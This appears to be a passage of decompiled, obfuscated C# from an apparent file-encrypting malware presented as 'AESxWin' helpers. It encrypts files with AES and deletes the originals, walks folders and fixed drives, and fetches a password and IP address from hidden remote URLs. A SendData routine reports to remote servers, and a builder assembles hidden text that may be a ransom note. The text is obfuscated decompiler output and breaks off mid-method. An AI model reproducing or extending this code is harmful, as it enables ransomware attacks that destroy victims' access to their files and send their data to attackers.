using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using A6yJVNZuoAn9NC1LAS;
using SharpAESCrypt;

namespace AESxWin.Helpers;

public static class _0092_008C_0095_0095_0095_008C_008D_0089_008D_0090_0086_008A_0094_0092_008B_008B_0093_0089_008E_008D_0087_0086_008A_008E_0091_0086_0087_0089_008F_0087_0089_008F_0086_008E_0093_008E
{
	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_003CEncryptFileAsync_003Ed__0))]
	[DebuggerStepThrough]
	public static Task EncryptFileAsync(this string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0021
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0088: Incompatible stack heights: 0 vs 1
		int num = 7;
		_003CEncryptFileAsync_003Ed__0 stateMachine = default(_003CEncryptFileAsync_003Ed__0);
		AsyncTaskMethodBuilder _003C_003Et__builder = default(AsyncTaskMethodBuilder);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 0:
					stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
					goto default;
				case 6:
					stateMachine.password = _0020;
					num2 = 0;
					continue;
				case 7:
					stateMachine = new _003CEncryptFileAsync_003Ed__0();
					_ = 1;
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						num2 = 3;
						continue;
					}
					num = 2;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto default;
				case 1:
				case 2:
					stateMachine.path = _0020;
					num2 = 6;
					continue;
				default:
					stateMachine._003C_003E1__state = -1;
					num = 8;
					if (true)
					{
						break;
					}
					goto case 5;
				case 5:
					_003C_003Et__builder.Start(ref stateMachine);
					num = 9;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 8;
				case 8:
					_003C_003Et__builder = stateMachine._003C_003Et__builder;
					num2 = 5;
					continue;
				case 9:
					return stateMachine._003C_003Et__builder.Task;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void EncryptFileAsync(this string _0020, string _0020, bool _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		if (!_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(116))
		{
			return;
		}
		try
		{
			_008A_008E_0094_008E_0095_0089_008F_0092_0088_0093_008A_008E_008A_0089_0087_0090_0095_0091_0088_0088_0087_0088_0095_0090_0092_008A_0091_0091_008B_0093_0090_008E_008B_0088_008B_0089.Encrypt(_0020, _0020, _0020 + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(256));
			if (_0020)
			{
				try
				{
					File.Delete(_0020);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch (Exception ex)
		{
			string text = DateTime.Now.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2224));
			string text2 = Path.Combine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(212), text + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(224));
			_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(text2, ex.ToString());
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CEncryptFilesAsync_003Ed__2))]
	public static Task EncryptFilesAsync(this IEnumerable<string> paths, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CEncryptFilesAsync_003Ed__2 stateMachine = new _003CEncryptFilesAsync_003Ed__2();
		stateMachine.paths = paths;
		stateMachine.password = _0020;
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_003CDecryptFileAsync_003Ed__3))]
	[DebuggerStepThrough]
	public static Task DecryptFileAsync(this string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0084
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 1;
		int num = (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091() ? 4 : 5);
		_003CDecryptFileAsync_003Ed__3 stateMachine = default(_003CDecryptFileAsync_003Ed__3);
		AsyncTaskMethodBuilder _003C_003Et__builder = default(AsyncTaskMethodBuilder);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 0:
					case 5:
						stateMachine = new _003CDecryptFileAsync_003Ed__3();
						num2 = 8;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0091;
						}
						goto case 1;
					case 8:
						stateMachine.path = _0020;
						goto case 2;
					case 3:
						stateMachine._003C_003E1__state = -1;
						num3 = 1;
						continue;
					case 2:
					case 4:
						stateMachine.password = _0020;
						num3 = 6;
						continue;
					case 6:
						stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
						goto case 3;
					default:
						num3 = 3;
						continue;
					case 1:
						_003C_003Et__builder = stateMachine._003C_003Et__builder;
						num3 = 7;
						continue;
					case 7:
						break;
					case 9:
						return stateMachine._003C_003Et__builder.Task;
					}
					goto end_IL_008d;
					continue;
					end_IL_0091:
					break;
				}
				continue;
				end_IL_008d:
				break;
			}
			_003C_003Et__builder.Start(ref stateMachine);
			num = 9;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string RemoveExtension(this string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return Path.ChangeExtension(_0020, "")!.TrimEnd(new char[1] { '.' });
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CDecryptFilesAsync_003Ed__5))]
	public static Task DecryptFilesAsync(this IEnumerable<string> paths, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CDecryptFilesAsync_003Ed__5 stateMachine = new _003CDecryptFilesAsync_003Ed__5();
		stateMachine.paths = paths;
		stateMachine.password = _0020;
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static IEnumerable<string> GetFolderFilesPaths(this string _0020, bool _0020 = true)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		List<string> list = new List<string>();
		try
		{
			if (!Directory.Exists(_0020))
			{
				return list;
			}
			if (_0020)
			{
				string[] directories = Directory.GetDirectories(_0020);
				if (directories != null)
				{
					string[] array = directories;
					foreach (string text in array)
					{
						list.AddRange(text.GetFolderFilesPaths());
					}
				}
			}
			string[] files = Directory.GetFiles(_0020);
			if (files != null)
			{
				list.AddRange(files);
			}
		}
		catch
		{
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static IEnumerable<string> ParseExtensions(this string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		List<string> list = new List<string>();
		string value = Regex.Match(_0020, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2228)).Value;
		if (!string.IsNullOrWhiteSpace(value))
		{
			_0020 = _0020.Replace(value, string.Empty);
		}
		MatchCollection matchCollection = Regex.Matches(_0020, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2232));
		foreach (object item in matchCollection)
		{
			list.Add(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2236) + item.ToString());
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool CheckExtension(this string _0020, IEnumerable<string> extensions)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		if (extensions == null)
		{
			return true;
		}
		if (extensions.Count() == 0)
		{
			return true;
		}
		foreach (string extension in extensions)
		{
			if (_0020.ToLower().EndsWith(extension.ToLower()))
			{
				return true;
			}
		}
		return false;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool CheckExtension(this string _0020, string[] _0020)
	{
		//Discarded unreachable code: IL_0005, IL_001e, IL_00f7
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_01c5: Incompatible stack heights: 0 vs 1
		int num = 0;
		bool flag = default(bool);
		string[] array = default(string[]);
		int num4 = default(int);
		bool flag2 = default(bool);
		string text = default(string);
		bool result = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 3:
						if (!flag)
						{
							array = _0020;
							goto case 2;
						}
						num3 = 10;
						continue;
					case 5:
					case 9:
						goto IL_00a5;
					case 1:
						goto IL_015b;
					case 2:
						num4 = 0;
						num3 = 4;
						continue;
					case 11:
						result = true;
						num3 = 8;
						continue;
					case 12:
						goto IL_019d;
					case 4:
					case 7:
						goto IL_01a9;
					case 10:
						goto IL_01bd;
					case 0:
						goto IL_01d9;
					case 6:
					case 8:
					case 13:
					case 14:
						return result;
					}
					break;
					IL_01bd:
					result = true;
					_ = 0;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num3 = 5;
						continue;
					}
					goto IL_01ca;
				}
				num2 = 2;
				continue;
				IL_019d:
				result = false;
				num = 14;
				break;
				IL_01d9:
				flag2 = _0020 == null;
				num2 = 1;
				continue;
				IL_01ca:
				num2 = 13;
				continue;
				IL_01a9:
				if (num4 < array.Length)
				{
					text = array[num4];
					goto IL_00a5;
				}
				num = 12;
				break;
				IL_00a5:
				try
				{
					bool flag3 = _0020.ToLower().EndsWith(text.ToLower());
					_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
					int num5;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num5 = 2;
					}
					else
					{
						num5 = 3;
						if (1 == 0)
						{
							return result;
						}
					}
					while (true)
					{
						switch (num5)
						{
						default:
							result = true;
							num5 = 4;
							if (0 == 0)
							{
								break;
							}
							goto case 0;
						case 0:
						case 2:
							if (flag3)
							{
								goto default;
							}
							goto end_IL_0100;
						case 4:
							return result;
						}
						continue;
						end_IL_0100:
						break;
					}
				}
				catch
				{
				}
				num4++;
				num2 = 7;
				if (true)
				{
					continue;
				}
				goto IL_015b;
				IL_015b:
				if (flag2)
				{
					num = 11;
					break;
				}
				flag = _0020.Count() == 0;
				num = 3;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static DriveInfo[] GetDrives()
	{
		//Discarded unreachable code: IL_0005, IL_0049
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 5;
			goto IL_0052;
		}
		int num2 = 6;
		goto IL_004e;
		IL_004e:
		num = num2;
		goto IL_0052;
		IL_0052:
		IEnumerable<DriveInfo> enumerable = default(IEnumerable<DriveInfo>);
		DriveInfo[] result = default(DriveInfo[]);
		while (true)
		{
			int num3 = num;
			while (true)
			{
				switch (num3)
				{
				case 1:
				case 6:
					if (enumerable != null)
					{
						num2 = 4;
						break;
					}
					goto IL_00d9;
				case 4:
					if (enumerable.Any())
					{
						goto IL_00c3;
					}
					goto IL_00d9;
				default:
					num2 = 2;
					break;
				case 0:
				case 5:
					enumerable = from _0020 in DriveInfo.GetDrives()
						where _0020.DriveType == DriveType.Fixed
						select _0020;
					goto case 1;
				case 2:
					goto IL_00c3;
				case 3:
				case 7:
					{
						return result;
					}
					IL_00d9:
					result = null;
					num = 7;
					if (0 == 0)
					{
						goto end_IL_0056;
					}
					goto case 3;
				}
				goto end_IL_0052;
				IL_00c3:
				result = enumerable.ToArray();
				num3 = 3;
				continue;
				end_IL_0056:
				break;
			}
			continue;
			end_IL_0052:
			break;
		}
		goto IL_004e;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _0094_0090_008D_0086_008A_0087_0087_008C_0092_0091_0090_0089_008B_0091_0087_0092_008D_008B_0088_008E_0093_0088_0091_0095_008F_0095_0094_0087_0094_0089_008E_0086_0095_0094_0094_0091
{
	private static int CurrentIndex = 0;

	public static Uri[] Urls = new Uri[2]
	{
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2240)),
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2244))
	};

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CGetIP_003Ed__2))]
	public static Task<string> GetIP()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CGetIP_003Ed__2 stateMachine = new _003CGetIP_003Ed__2();
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder<string>.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder<string> _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086
{
	public static object _locker = new object();

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void WriteLog(string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0071
		//IL_0006: Incompatible stack heights: 0 vs 1
		try
		{
			lock (_locker)
			{
				_ = 0;
				int num;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num = 2;
				}
				else
				{
					num = 3;
					if (1 == 0)
					{
						return;
					}
				}
				switch (num)
				{
				case 0:
				case 2:
					File.AppendAllText(_0020, string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2248), DateTime.Now.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2252)), _0020 + Environment.NewLine));
					break;
				case 3:
					break;
				}
			}
		}
		catch
		{
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _008B_008D_008A_008F_008B_008D_0086_0091_0092_0089_0089_0090_008D_008A_008C_0087_008C_008C_0086_008F_0093_0095_0090_008B_0090_0087_0095_0095_0094_008C_0086_0087_0094_008B_008F_0090
{
	private static int CurrentIndex = 0;

	public static Uri[] Urls = new Uri[2]
	{
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2256)),
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2260))
	};

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_003CGetPassword_003Ed__2))]
	[DebuggerStepThrough]
	public static Task<string> GetPassword()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CGetPassword_003Ed__2 stateMachine = new _003CGetPassword_003Ed__2();
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder<string>.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder<string> _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _0088_0095_0093_0088_0093_0095_0090_008F_0095_0090_0095_008F_0092_0087_008C_0092_0089_008B_0090_008A_0090_0089_0092_0095_0090_008E_008D_008E_0088_008F_0095_0089_0088_008F_008C_008F
{
	private static int CurrentIndex = 0;

	public static string[] Urls = new string[2]
	{
		_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2272),
		_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2276)
	};

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string SendData(string _0020, string _0020, DateTime _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0102, IL_019b
		//IL_0006: Incompatible stack heights: 0 vs 1
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num = (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091() ? 4 : 3);
		string empty = default(string);
		Uri uri = default(Uri);
		string absoluteUri = default(string);
		string result = default(string);
		while (true)
		{
			switch (num)
			{
			case 0:
			case 3:
				empty = string.Empty;
				goto case 1;
			case 2:
				try
				{
					string text = _0020.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2264));
					for (int i = 0; i < Urls.Length; i++)
					{
						if (string.IsNullOrEmpty(Urls[CurrentIndex]))
						{
							continue;
						}
						try
						{
							WebClient webClient = new WebClient();
							_ = 0;
							int num3;
							if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
							{
								num3 = 1;
								goto IL_010f;
							}
							int num4 = 3;
							goto IL_010b;
							IL_010b:
							num3 = num4;
							goto IL_010f;
							IL_010f:
							while (true)
							{
								switch (num3)
								{
								default:
									goto IL_008c;
								case 0:
								case 1:
									uri = new Uri(new Uri(Urls[CurrentIndex]), string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2268), _0020, _0020, text, _0020));
									num4 = 4;
									if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
									{
										goto IL_008c;
									}
									break;
								case 4:
									absoluteUri = uri.AbsoluteUri;
									goto IL_008c;
								case 5:
									CurrentIndex = 0;
									goto end_IL_010f;
								}
								goto IL_010b;
								IL_008c:
								webClient.DownloadString(absoluteUri);
								num3 = 5;
								continue;
								end_IL_010f:
								break;
							}
						}
						catch (Exception)
						{
							CurrentIndex++;
							continue;
						}
						break;
					}
				}
				catch
				{
				}
				result = empty;
				num = 5;
				break;
			case 1:
			case 4:
				CurrentIndex = 0;
				goto case 2;
			default:
			{
				int num2 = 2;
				num = num2;
				break;
			}
			case 5:
				return result;
			}
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _0095_008F_0094_008F_008B_008C_0087_0091_0093_008C_0087_0090_0088_0092_008C_0090_0088_008B_008F_008B_0086_0088_0093_0090_0088_0092_008D_0086_0087_0093_008D_0091_0095_0086_0095_0090
{
	public static string StaticText
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005, IL_04bb
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_03cb: Incompatible stack heights: 0 vs 1
			int num = 33;
			if (false)
			{
				goto IL_0016;
			}
			goto IL_04c4;
			IL_04c4:
			StringBuilder stringBuilder = default(StringBuilder);
			string result = default(string);
			while (true)
			{
				IL_04c4_2:
				int num2 = num;
				while (true)
				{
					int num3;
					switch (num2)
					{
					case 37:
						break;
					case 7:
					case 35:
						stringBuilder.AppendLine("");
						num2 = 19;
						continue;
					case 2:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2304));
						num2 = 25;
						continue;
					case 41:
						goto IL_0066;
					case 10:
					case 17:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2328));
						num2 = 23;
						continue;
					case 26:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2336));
						num3 = 0;
						goto IL_04c0;
					case 6:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2312));
						num = 20;
						goto IL_04c4_2;
					case 16:
						stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
						num = 11;
